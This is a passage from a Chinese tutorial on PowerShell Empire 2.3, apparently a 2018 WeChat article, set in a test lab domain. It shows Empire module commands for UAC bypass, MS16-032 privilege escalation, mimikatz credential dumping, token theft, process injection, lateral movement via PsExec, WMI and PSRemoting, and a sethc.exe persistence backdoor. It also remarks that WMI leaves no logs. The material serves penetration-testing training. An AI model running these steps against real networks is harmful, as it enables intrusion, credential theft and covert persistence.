style="font-size:14px;line-height:34px;;">使用usemodule situational_awareness/network/powerview/find_localadmin_access模块，不需要做什么设置，直接运行execute即可，结果如下图所示。</span></p><p><img class="" data-ratio="0.20434782608695654" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/25_KE0jqN0vZKtKGicCPvQyiaRbVDniaA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpR3PibAKQUzALezLJXPpt5k3f7gCUFKE0jqN0vZKtKGicCPvQyiaRbVDniaA/640?wx_fmt=png'" data-type="png" data-w="920"  /></p><p><span style="font-size:14px;line-height:34px;;">可以看到有2台计算机，名字分别为：</span></p><p><span style="font-size:14px;line-height:34px;;">WIN7-64.shuteer.testlab</span></p><p><span style="font-size:14px;line-height:34px;;">WIN7-X86.shuteer.testlab</span></p><p><span style="font-size:14px;line-height:34px;;">10.获取域控制器</span></p><p><span style="font-size:14px;line-height:34px;;">现在可以用usemodulesituational_awareness/network/powerview/get_domain_controller模块来确定我们当前的域控制器，因为我们有了域用户权限，输入execute，如下图所示。</span></p><p><img class="" data-ratio="0.6233611442193087" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/26_dx335ramJ4eJbAdArtYykGFbnUIjSw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRjjquvyyB7br72zVhYtxm8TtKdx335ramJ4eJbAdArtYykGFbnUIjSw/640?wx_fmt=png'" data-type="png" data-w="839"  /></p><p><span style="font-size:14px;line-height:34px;;">当前域服务器名为DC。</span></p><p><span style="font-size:14px;line-height:34px;;">我们再验证下能否访问域服务器DC的“C$”，同样顺利访问，如下图所示。</span></p><p><img class="" data-ratio="0.4605009633911368" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/27_BpEcx6HS6uVaTcs5ia1lKCbwUNiazg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRCAH7UGj5aX6ZCWJY14abibNTxMOBpEcx6HS6uVaTcs5ia1lKCbwUNiazg/640?wx_fmt=png'" data-type="png" data-w="519"  /></p><h2 name="h2-2"><strong><span style="font-size:14px;line-height:34px;;">0×06.&nbsp;提权</span></strong></h2><p><strong><span style="font-size:14px;line-height:34px;;"><br  /></span></strong></p><p><span style="font-size:14px;line-height:34px;;">Windows在Vista系统开始引入UAC账户控制体系，分为三个级别：</span></p><p><span style="font-size:14px;line-height:34px;;">高:完整的管理员权限</span></p><p><span style="font-size:14px;line-height:34px;;">中：标准用户权限</span></p><p><span style="font-size:14px;line-height:34px;;">低：很低的权限</span></p><p><span style="font-size:14px;line-height:34px;;">即使当前用户是本地管理员，双击运行大部分应用程序时也是以标准用户权限运行的(除非右击-选择以管理员身份运行)。所以即使我们获得的权限是本地管理员权限，也没有办法执行一些命令（特殊注册表写入、LSASS读取/写入等等），所以渗透的第一步便是提权，提权的前提便是知道自己拥有什么权限，可以输入一下命令来查询：</span></p><p><span style="font-size:14px;line-height:34px;;">Whoami /groups</span></p><p><span style="font-size:14px;line-height:34px;;">这个命令会输出我当前用户所属的组和所拥有的权限，显示High Mandatory Level表示拥有管理员权限，显示Medium Mandatory Level表示拥有一个标准用户权限，这里我们是一个标准用户权限，如下图所示。</span></p><p><img class="" data-ratio="0.2905894519131334" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/28_jES2zh3MC6gqIPBKvralS0YsJyPibw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRibV8gqwVBkgvmibzDfPclsdANiaIjES2zh3MC6gqIPBKvralS0YsJyPibw/640?wx_fmt=png'" data-type="png" data-w="967"  /></p><p><span style="font-size:14px;line-height:34px;;">1.bypassuac</span></p><p><span style="font-size:14px;line-height:34px;;">&nbsp;输入usemodule privesc/bypassuac，设置Listener参数，运行execute，上线了一个新的反弹，如下图所示。</span></p><p><img class="" data-ratio="0.24735729386892177" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/29_0RyFnqGd5FV1HeQLkBqMVN8MuV3jGA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRN6bNZpumy5bAKTgPgjbPtibcM0RyFnqGd5FV1HeQLkBqMVN8MuV3jGA/640?wx_fmt=png'" data-type="png" data-w="473"  /></p><p><span style="font-size:14px;line-height:34px;;">这里我们回到agents下面，输入list命令，可以看到多了一个agents，带星号的即为提权成功的，如下图所示。</span></p><p><img class="" data-ratio="0.17289073305670816" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/30_ZEcCdnFuj1122s3gN6hrB9fdNJDtKA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRkWbWJxX4X8iad80ZJGEvIsNw5ZEcCdnFuj1122s3gN6hrB9fdNJDtKA/640?wx_fmt=png'" data-type="png" data-w="723"  /></p><p><span style="font-size:14px;line-height:34px;;">2. bypassuac_wscript</span></p><p><span style="font-size:14px;line-height:34px;;">这个模块大概原理是使用c:Windowswscript.exe执行payload，实现管理员权限执行payload，绕过UAC。只适用于系统为Windows 7，目前尚没有对应补丁，部分杀毒软件会有提示。如下图所示，带型号的即为提权成功的。</span></p><p><img class="" data-ratio="0.2617753623188406" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/31_aCoWhPu20Psv8ZRhfxf0G8myOqtRew.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRtexZC0oNXTUGJQibkTyZm7kvmiaCoWhPu20Psv8ZRhfxf0G8myOqtRew/640?wx_fmt=png'" data-type="png" data-w="1104"  /></p><p><span style="font-size:14px;line-height:34px;;">3. ms16-032</span></p><p><span style="font-size:14px;line-height:34px;;">Empire自带了MS16-032 (KB3124280) 模块，输入usemodule privesc/ms16-032，只需要设置下Listener，运行提权成功，如下图所示。</span></p><p><img class="" data-ratio="0.4899598393574297" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/32_YvMKiamdr2Z7ohkYaGBkO8c27cvKfQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRWB1YFfWmWQ2DHokiaHfroichxqyYvMKiamdr2Z7ohkYaGBkO8c27cvKfQ/640?wx_fmt=png'" data-type="png" data-w="498"  /></p><p><span style="font-size:14px;line-height:34px;;">除了ms16-032，Empire还带了ms16-135(KB3198234)模块，使用方法一样，在测试中，WIN764位系统出现了蓝屏，请谨慎使用。如下图所示。</span></p><p><img class="" data-ratio="0.7684887459807074" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/33_SGzm7kHbhkOmKbIxe399W4u8O1FPKw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRedp0ZB6BtJLFTyWQHVSl6IPpSGzm7kHbhkOmKbIxe399W4u8O1FPKw/640?wx_fmt=png'" data-type="png" data-w="622"  /></p><p><span style="font-size:14px;line-height:34px;;">4.PowerUp</span></p><p><span style="font-size:14px;line-height:34px;;">Empire内置了PowerUp部分工具，用于系统提权，主要为Windows错误系统配置漏洞，Windows Services漏洞，AlwaysInstallElevated漏洞等8种提权方式，输入“usemodule privesc/powerup”然后按Tab键来查看完整列表，如下图所示。</span></p><p><img class="" data-ratio="0.08566433566433566" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/34_FUJLNJAU4sQkF1hWVARxtw3wZ8hucQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRxf5wCwibvLjn9a8Df2YkzebxiaFUJLNJAU4sQkF1hWVARxtw3wZ8hucQ/640?wx_fmt=png'" data-type="png" data-w="572"  /></p><p><span style="font-size:14px;line-height:34px;;">4.1 AllChecks模块</span></p><p><span style="font-size:14px;line-height:34px;;">如何查找上述漏洞，就要用到这个模块了。和Powersploit下powerup中的Invoke-AllChecks模块一样，该模块可以执行所有脚本检查系统漏洞，输入下列命令，如下图所示。</span></p><p><span style="font-size:14px;line-height:34px;;">usemodule privesc/powerup/allchecks</span></p><p><span style="font-size:14px;line-height:34px;;">execute</span></p><p><img class="" data-ratio="0.5556586270871985" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/35_9QMzoEeBX0uW16icibGS992flBrXbg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpR8NyibExkIs4ectVL8BpUz2cDQ6k9QMzoEeBX0uW16icibGS992flBrXbg/640?wx_fmt=png'" data-type="png" data-w="1078"  /></p><p><span style="font-size:14px;line-height:34px;;">可以看到，他列出了很多方法，我们可以尝试用第一种方法bypassuac来提权，提权之前我们看下当前agents，可以看到只有一个普通权限，Name为CD3FRRYCFVTYXN3S，IP为192.168.31.251的客户端，如下图所示。</span></p><p><span style="font-size:14px;line-height:34px;;">接着我们输入bypassuac test来提权，等几秒钟，就会给我们返回一个更高权限的shell，如下图所示</span></p><p><img class="" data-ratio="0.10044444444444445" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/36_pkV85O3kGJqxZ69jiawFo4HHtvjW6g.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRRPMQ03vQSBoDIUZPPtXh9b27rpkV85O3kGJqxZ69jiawFo4HHtvjW6g/640?wx_fmt=png'" data-type="png" data-w="1125"  /></p><p><img class="" data-ratio="0.14393939393939395" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/37_Kp1mQKR7jfxudUo6KCzm5Csea8GSUw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpR5y8JnMickkeLff7STf4SxaL3gKp1mQKR7jfxudUo6KCzm5Csea8GSUw/640?wx_fmt=png'" data-type="png" data-w="660"  /></p><p><span style="font-size:14px;line-height:34px;;">我们再次输入agents命令来查看当前agents，可以看到多了一个高权限（带星号）Name为341CNFUFK3PKUDML的客户端，如下图所示，提权成功。</span><img class="" data-ratio="0.13644524236983843" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/38_KxuAh8z2Aib1yyKDkgTDjCibPYyXKg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRrEnibPUK0uZ7LkV6Hiby8quMunRPKxuAh8z2Aib1yyKDkgTDjCibPYyXKg/640?wx_fmt=png'" data-type="png" data-w="1114" style="font family: 微软雅黑, sans-serif;font-size:14px;line-height:34px;;text-indent: 2em;"  /></p><p><span style="font-size:14px;line-height:34px;;">4.2模块使用说明</span></p><p><span style="font-size:14px;line-height:34px;;">官方说明如下：</span></p><p><span style="font-size:14px;line-height:34px;;">l&nbsp;&nbsp;对于任何没有引号的服务路径问题</span></p><p><span style="font-size:14px;line-height:34px;;">l&nbsp;&nbsp;对于ACL配置错误的任何服务（可通过service_ *利用&nbsp;&nbsp;）</span></p><p><span style="font-size:14px;line-height:34px;;">l&nbsp;&nbsp;服务可执行文件上的任何不当权限（可通过service_exe_ *进行利用）</span></p><p><span style="font-size:14px;line-height:34px;;">l&nbsp;&nbsp;对于任何剩余的unattend.xml文件</span></p><p><span style="font-size:14px;line-height:34px;;">l&nbsp;&nbsp;如果AlwaysInstallElevated注册表项设置</span></p><p><span style="font-size:14px;line-height:34px;;">l&nbsp;&nbsp;如果有任何Autologon凭证留在注册表中</span></p><p><span style="font-size:14px;line-height:34px;;">l&nbsp;&nbsp;用于任何加密的web.config字符串和应用程序池密码</span></p><p><span style="font-size:14px;line-height:34px;;">l&nbsp;&nbsp;对于任何％PATH％.DLL劫持机会（可通过write_dllhijacker利用）</span></p><p><span style="font-size:14px;line-height:34px;;">具体使用方法可参见我之间几篇文章：</span></p><p><span style="font-size:14px;line-height:34px;;">A.Metasploit、powershell之Windows错误系统配置漏洞实战提权</span></p><p><span style="font-size:14px;line-height:34px;;">http://www.freebuf.com/articles/system/131388.html&nbsp;</span></p><p><span style="font-size:14px;line-height:34px;;">B.metasploit之Windows Services漏洞提权实战</span></p><p><span style="font-size:14px;line-height:34px;;">http://www.4hou.com/technology/4180.html</span></p><p><span style="font-size:14px;line-height:34px;;">C.Metasploit、Powershell之AlwaysInstallElevated提权实战</span></p><p><span style="font-size:14px;line-height:34px;;">https://xianzhi.aliyun.com/forum/read/1488.html</span></p><p><span style="font-size:14px;line-height:34px;;">5.GPP</span></p><p><span style="font-size:14px;line-height:34px;;">在域里面很多都会启用组策略首选项来执行本地密码更改，以便于管理和映像部署。缺点是任何普通域用户都可以从相关域控制器的SYSVOL中读取到部署信息。虽然他是采用AES 256加密的，使用usemodule privesc/gpp ，如下图所示。</span><img class="" data-ratio="1.1632" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/39_s1AtFfSMIn5XECI4YcjjwYr87QMNZQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRhLVVTvC8mjCraEG3UmVQD0t3s1AtFfSMIn5XECI4YcjjwYr87QMNZQ/640?wx_fmt=png'" data-type="png" data-w="625" style="font family: 微软雅黑, sans-serif;font-size:14px;line-height:34px;;text-indent: 2em;"  /></p><h2 name="h2-3"><strong><span style="font-size:14px;line-height:34px;;"><br  /></span></strong></h2><h2 name="h2-3"><strong><span style="font-size:14px;line-height:34px;;">0×07.&nbsp;横向渗透</span></strong></h2><p><strong><span style="font-size:14px;line-height:34px;;"><br  /></span></strong></p><p><span style="font-size:14px;line-height:34px;;">1.令牌窃取</span></p><p><span style="font-size:14px;line-height:34px;;">我们在获取到服务器权限后，可以使用内置mimikatz获取系统密码，执行完毕后输入creds命令查看Empire列举的密码。如下图所示。</span><img class="" data-ratio="0.358600583090379" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/40_LvFibcgxcSXwb0BXIdn2CiazKO2DnA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpR9YCliak1z8All3Sp1EkBWdxibBaPLvFibcgxcSXwb0BXIdn2CiazKO2DnA/640?wx_fmt=png'" data-type="png" data-w="1029" style="font family: 微软雅黑, sans-serif;font-size:14px;line-height:34px;;text-indent: 2em;"  /></p><p><span style="font-size:14px;line-height:34px;;">发现有域用户在此服务器上登陆，此时我们可以窃取域用户身份，然后进行横向移动，首先先来窃取身份，使用命令pth&lt;ID&gt;，这里的ID号就是creds下的CredID号，我们这里来窃取administrator的身份令牌，执行Pth 7命令，如下图所示。</span><img class="" data-ratio="0.57631822386679" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/41_qJ8SnQhdr8ZDxCzuoqUSIRulGbRa7A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRVOtOOrAaawsAAb1q3EpgDPicgqJ8SnQhdr8ZDxCzuoqUSIRulGbRa7A/640?wx_fmt=png'" data-type="png" data-w="1081" style="font family: 微软雅黑, sans-serif;font-size:14px;line-height:34px;;text-indent: 2em;"  /></p><p><span style="font-size:14px;line-height:34px;;">可以看到进程号为1380，使用steal_token PID命令就窃取了该身份令牌了，如下图所示。</span><img class="" data-ratio="0.11827956989247312" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/42_gxQeq2FEFBFl3ov4u7nSUHhibWibGQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRiaKUsnIicKibTsJicEcGdl17xNGWOGgxQeq2FEFBFl3ov4u7nSUHhibWibGQ/640?wx_fmt=png'" data-type="png" data-w="651" style="font family: 微软雅黑, sans-serif;font-size:14px;line-height:34px;;text-indent: 2em;"  /></p><p><span style="font-size:14px;line-height:34px;;">同样我们也可以在通过PS命令查看当前进程，查看是否有域用户的进程，如下图所示。</span><img class="" data-ratio="0.46107784431137727" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/43_r9tK7icCV5h8ccziciaQic1b9js2wQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRIrrCLrnGxYqoic3jemdPpj2eeLt3Ar9tK7icCV5h8ccziciaQic1b9js2wQ/640?wx_fmt=png'" data-type="png" data-w="668" style="font family: 微软雅黑, sans-serif;font-size:14px;line-height:34px;;text-indent: 2em;"  /></p><p><span style="font-size:14px;line-height:34px;;">可以看到有域用户的进程，这里我们选用同一个Name为CMD，PID为1380的进程，如下图所示。</span><img class="" data-ratio="0.06564885496183206" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/44_HOxHz8lnfPumQ4t4BO1FdtcrcUSvRg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRbUVxtP4ANdKdRlFHNeTLNJcZHOxHz8lnfPumQ4t4BO1FdtcrcUSvRg/640?wx_fmt=png'" data-type="png" data-w="655" style="font family: 微软雅黑, sans-serif;font-size:14px;line-height:34px;;text-indent: 2em;"  /></p><p><span style="font-size:14px;line-height:34px;;">同样通过steal_token命令来窃取这个命令，我们先尝试访问域内另一台主机WIN7-X86的“C$”，顺利访问，如下图所示。</span></p><p><span style="font-size:14px;line-height:34px;;">输入revtoself命令可以将令牌权限恢复到原来的状态，如下图所示：</span><img class="" data-backh="54" data-backw="409" data-before-oversubscription-url="http://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpROic5rkat6kTGIq62QAZDpWyTGxlgyVb6I6fog8GiajfyYk98ib2Qhwv2g/0?wx_fmt=png" data-ratio="0.13202933985330073" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/45_gyVb6I6fog8GiajfyYk98ib2Qhwv2g.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpROic5rkat6kTGIq62QAZDpWyTGxlgyVb6I6fog8GiajfyYk98ib2Qhwv2g/640?wx_fmt=png'" data-type="png" data-w="409" style="font family: 微软雅黑, sans-serif;font-size:14px;line-height:34px;;text-indent: 2em;width: 100%;"  /><span style="font-size:14px;line-height:34px;;">2.会话注入我们也可以使用usemodule management/psinject模块来进程注入，获取权限，输入info查看参数设置，如下图所示。</span><img class="" data-ratio="0.7727272727272727" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/46_4kpM2IFGQQr216t9xgViaKDzHkFSSQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRdtv6bG5rqNgAiatMTh9R05lphE4kpM2IFGQQr216t9xgViaKDzHkFSSQ/640?wx_fmt=png'" data-type="png" data-w="682" style="font family: 微软雅黑, sans-serif;font-size:14px;line-height:34px;;text-indent: 2em;"  /><img class="" data-ratio="0.6549079754601227" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/47_jAqxIbddbxrYbHZnv9g6CZKAicrjdw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRDwUAHRYSrmgqVv2sTK1icgoctWjAqxIbddbxrYbHZnv9g6CZKAicrjdw/640?wx_fmt=png'" data-type="png" data-w="652"  /></p><p><span style="font-size:14px;line-height:34px;;">设置下Listeners和ProcID这2个参数，这里的ProcID还是之前的CMD的1380，运行后反弹回一个域用户权限shell，如下图所示。</span></p><p><img class="" data-ratio="0.3183279742765273" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/48_4DdJtMrKeBf0eK4yohIJbHIsTE7kVw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRDqFlk2G9mVn6EdYwsygezhCic4DdJtMrKeBf0eK4yohIJbHIsTE7kVw/640?wx_fmt=png'" data-type="png" data-w="933"  /></p><p><span style="font-size:14px;line-height:34px;;">3.Invoke-PsExec</span></p><p><span style="font-size:14px;line-height:34px;;">PsExec是我在Metasploit下经常使用的模块，还有pstools工具包当中也有psexec，缺点是该工具基本杀毒软件都能检测到，并会留下日志，而且需要开启admin$ 445端口共享。优点是可以直接返回SYSTEM权限。这里我们要演示的是Empire下的Invoke-Psexec模块。</span></p><p><span style="font-size:14px;line-height:34px;;">使用该模块的前提是我们已经获得本地管理员权限，甚至域管理员账户，然后以此来进一步持续渗透整个内网。</span></p><p><span style="font-size:14px;line-height:34px;;">我们测试该模块前看下当前agents，只有一个IP为192.168.31.251，机器名为WIN7-64的服务器，如下图所示。</span></p><p><img class="" data-ratio="0.1269126912691269" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/49_GZO81Hun4Hc71dDGvkhc2dQDice9Pg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpR3Wjt7kGibzwoq7llH3d0hJt9ITGZO81Hun4Hc71dDGvkhc2dQDice9Pg/640?wx_fmt=png'" data-type="png" data-w="1111"  /></p><p><span style="font-size:14px;line-height:34px;;">现在使用模块usemodule lateral_movement/invoke_psexec渗透域内另一台机器WIN7-X86，输入info查看设置参数，如下图所示。</span></p><p><img class="" data-ratio="0.7324324324324324" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/50_8Mp0gFBBSzWqOWDIhXK5Q2ojMN6sGA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpR7EE0RAasoOnwbJRKhvnF6wsG8Mp0gFBBSzWqOWDIhXK5Q2ojMN6sGA/640?wx_fmt=png'" data-type="png" data-w="740"  /></p><p><span style="font-size:14px;line-height:34px;;">这里要设置下机器名和监听，输入下列命令，反弹成功。如下图所示。</span></p><pre><span style="font-size:14px;line-height:34px;;">Set&nbsp;ComputerName&nbsp;WIN7-X86.shuteer.testlab<br  />Set&nbsp;Listenershuteer<br  />Execute<br  /></span></pre><p><img class="" data-ratio="0.17209908735332463" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/51_iaXmRDekJxqGwX486usAyMmXGY6nAQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRU5GOTYPh4Xhia1Jdib1RR1q8Ht3iaXmRDekJxqGwX486usAyMmXGY6nAQ/640?wx_fmt=png'" data-type="png" data-w="767"  /></p><p><span style="font-size:14px;line-height:34px;;">输入agents命令查看当前agents，多了一个IP为192.168.31.158，机器名为WIN7-X86的服务器，如下图所示。</span></p><p><img class="" data-ratio="0.14375561545372867" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/52_HunJvZibJ5VwuicNSscjHapvjCquyw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRZb4X1JwvIxFMtR42pwDBvMC8IMHunJvZibJ5VwuicNSscjHapvjCquyw/640?wx_fmt=png'" data-type="png" data-w="1113"  /></p><p><span style="font-size:14px;line-height:34px;;">4.Invoke-WMI</span></p><p><span style="font-size:14px;line-height:34px;;">它比PsExec安全，所有window系统启用该服务，当攻击者使用wmiexec来进行攻击时，Windows系统默认不会在日志中记录这些操作，这意味着可以做到攻击无日志，同时攻击脚本无需写入到磁盘，具有极高的隐蔽性。但防火墙开启将会无法连接。输入usemodule lateral_movement/invoke_wmi，使用该模块，输入info命令查看具体参数，如下图所示。</span></p><p><img class="" data-ratio="0.7759433962264151" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/53_kjn26fqXm7lpbD8TCkQZBLBvIlibTQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRiaBGRDcwdzSvgeibvpZpnqvSxt5kjn26fqXm7lpbD8TCkQZBLBvIlibTQ/640?wx_fmt=png'" data-type="png" data-w="848"  /></p><p><span style="font-size:14px;line-height:34px;;">这里一样需要设置下机器名和监听，输入下列命令，执行execute命令反弹成功。如下图所示。</span></p><pre><span style="font-size:14px;line-height:34px;;">Set&nbsp;ComputerName&nbsp;WIN7-X86.shuteer.testlab<br  />Set&nbsp;Listener&nbsp;shuteer<br  />Execute</span></pre><p><img class="" data-ratio="0.16216216216216217" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/54_lIzuwmrmVoyLUpUibQN4EYSnqIf5Bw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRghP2OM84uSueWshYD9e6WDk0MlIzuwmrmVoyLUpUibQN4EYSnqIf5Bw/640?wx_fmt=png'" data-type="png" data-w="740"  /></p><p><span style="font-size:14px;line-height:34px;;">WMI还有一个usemodule lateral_movement/invoke_wmi_debugger模块，是使用WMI去设置五个Windows Accessibility可执行文件中任意一个的调试器。这些可执行文件包括sethc.exe（粘滞键，五下shift可触发），narrator.exe（文本转语音，Utilman接口激活）、Utilman.exe（windows辅助管理器，Win+U启用），Osk.exe（虚拟键盘，Utilman接口启用）、Magnify.exe（放大镜，Utilman接口启用）。大家也可以尝试一下。</span></p><p><span style="font-size:14px;line-height:34px;;">5.Powershell Remoting</span></p><p><span style="font-size:14px;line-height:34px;;">PowerShell remoting是Powershell的远程管理功能，开启Windows远程管理服务WinRM会监听5985端口，该服务默认在Windows Server 2012中是启动的，在Windows Server 2003、2008和2008 R2需要通过手动启动。</span></p><p><span style="font-size:14px;line-height:34px;;">如果目标主机启用了PSRemoting，或者拥有启用它的权限的凭据，则可以使用他来进行横向渗透，使用usemodule lateral_movement/invoke_psremoting模块，如下图所示。</span></p><p><span style="font-size:14px;line-height:34px;;">&nbsp;</span><img class="" data-ratio="0.1505016722408027" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/55_mg6YRH7tE7O7MGkicHS7f1jDTNic1g.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRHTophHXmIwnV9rTGmCm2MiaL2Ipmg6YRH7tE7O7MGkicHS7f1jDTNic1g/640?wx_fmt=png'" data-type="png" data-w="897"  /></p><h2 name="h2-4"><strong><span style="font-size:14px;line-height:34px;;"><br  /></span></strong></h2><h2 name="h2-4"><strong><span style="font-size:14px;line-height:34px;;">0×08.&nbsp;后门</span></strong></h2><p><strong><span style="font-size:14px;line-height:34px;;"><br  /></span></strong></p><p><span style="font-size:14px;line-height:34px;;">1.权限持久性劫持shift后门</span></p><p><span style="font-size:14px;line-height:34px;;">输入命令usemodule lateral_movement/invoke_wmi_debuggerinfo模块，输入info查看设置参数，如下图所示。</span></p><p><img class="" data-ratio="0.30101302460202606" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/56_YvbDoicdCd4IicFKOiaEy2rjCtNm1Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRc9bTU2AzsJ6nsFok5DQt4yyHKL6YvbDoicdCd4IicFKOiaEy2rjCtNm1Q/640?wx_fmt=png'" data-type="png" data-w="691"  /></p><p><span style="font-size:14px;line-height:34px;;">这里需要设置几个参数，我们输入下面命令，如下图所示。</span></p><p><img class="" data-ratio="0.1074561403508772" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/57_F0HCjJSEJnO35h8g2cgfmfjWh007Ng.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibE2lQfr7OSTKLuaYt5lvpRN2Zaic7LBr6Sz58QczgLe5btsF0HCjJSEJnO35h8g2cgfmfjWh007Ng/640?wx_fmt=png'" data-type="png" data-w="912"  /></p><pre><span style="font-size:14px;line-height:34px;;">set&nbsp;Listener&nbsp;&nbsp;shuteer<br  />set&nbsp;ComputerName&nbsp;&nbsp;WIN7-64.shuteer.testlab<br  />set&nbsp;TargetBinary&nbsp;sethc.exe<br  />execute</span></pre><p><span style="font-size:14px;line-height:34px;;">运行后，在目标主机远程登录窗口按5次shift即可触发后门，有一个黑框一闪而过，如下图所示。</span></p><p><img class="" data-ratio="0.6562905317769131" src="图片/HACK学习呀_2018-09-29_一篇文章精通PowerShellEmpire2.3（下）/58_rGTEJYHO3TwMQiafdvUuKPCaxIkmmQ.png" 